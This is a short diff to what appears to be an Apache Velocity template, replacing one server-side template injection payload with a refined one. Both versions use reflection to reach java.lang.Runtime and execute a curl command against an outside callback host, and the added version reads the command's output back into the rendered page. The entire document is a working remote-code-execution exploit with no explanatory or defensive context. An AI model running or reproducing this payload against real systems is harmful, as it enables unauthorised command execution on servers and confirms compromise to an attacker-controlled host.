@@ -1,3 +1,6 @@
-#set($e="e")
-$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', $e.getClass().forName('java.lang.Runtime')).invoke(String.class.getClass().forName("java.lang.Runtime"),new String[]{"/usr/bin/curl", "http://wikiqiyi.devil.dns.yoyostay.top"}).toString()
-
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('curl http://wikiqiy.devil.dns.yoyostay.top'))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
